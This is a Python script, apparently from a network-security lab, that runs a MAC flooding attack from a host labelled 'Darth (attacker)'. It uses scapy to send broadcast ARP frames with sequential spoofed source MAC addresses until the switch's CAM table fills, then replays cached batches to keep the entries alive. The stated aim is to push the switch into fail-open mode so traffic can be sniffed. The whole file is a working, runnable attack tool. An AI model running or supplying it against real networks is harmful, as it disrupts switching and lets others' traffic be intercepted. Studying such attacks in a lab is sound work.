"""
mac.py — run on Darth (attacker)
MAC flooding: floods the switch's CAM table with frames carrying random
source MAC addresses. Once the table is full, the switch enters fail-open
mode and broadcasts all frames to every port — including Darth's.

Usage:
    sudo python3 mac.py
    sudo python3 mac.py --iface eth0 --burst 1000 --count 0
"""

from scapy.all import *
import typer
from rich.console import Console

console = Console()

BATCH = 1000


def _int_to_mac(n: int) -> str:
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        (n >> 40) & 0xFF,
        (n >> 32) & 0xFF,
        (n >> 24) & 0xFF,
        (n >> 16) & 0xFF,
        (n >> 8) & 0xFF,
        n & 0xFF,
    )


def main(
    iface: str = typer.Option(None, help="Interfaccia di rete (default: auto)"),
    burst: int = typer.Option(BATCH, help="Pacchetti per burst"),
    count: int = typer.Option(0, help="Totale pacchetti da inviare (0 = infinito)"),
    start: int = typer.Option(0, help="MAC di partenza (per istanze parallele)"),
):
    console.print(
        f"[red]MAC Flooding started[/red] — burst={burst}, start={start}, count={'∞' if count == 0 else count}"
    )
    console.print("[yellow]Press Ctrl+C to stop.[/yellow]")

    sent = 0
    all_batches: list = []  # tutti i batch inviati, per il refresh

    with console.status(f"Flooding... packets sent: {sent}") as status:
        while count == 0 or sent < count:
            # fase flood: nuovi MAC finché non superiamo 2x il burst accumulato
            if len(all_batches) * burst < 10000:
                batch = [
                    Ether(src=_int_to_mac(start + sent + i), dst="ff:ff:ff:ff:ff:ff")
                    / ARP(op=1, pdst="10.0.0.1")
                    for i in range(burst)
                ]
                all_batches.append(batch)
            else:
                # fase refresh: ricicla i batch già inviati per rinnovare il timer
                batch = all_batches[sent // burst % len(all_batches)]

            sendp(batch, iface=iface, inter=0, verbose=0)
            sent += len(batch)
            status.update(
                f"Flooding... packets sent: {sent} | batches in cache: {len(all_batches)}"
            )


if __name__ == "__main__":
    typer.run(main)
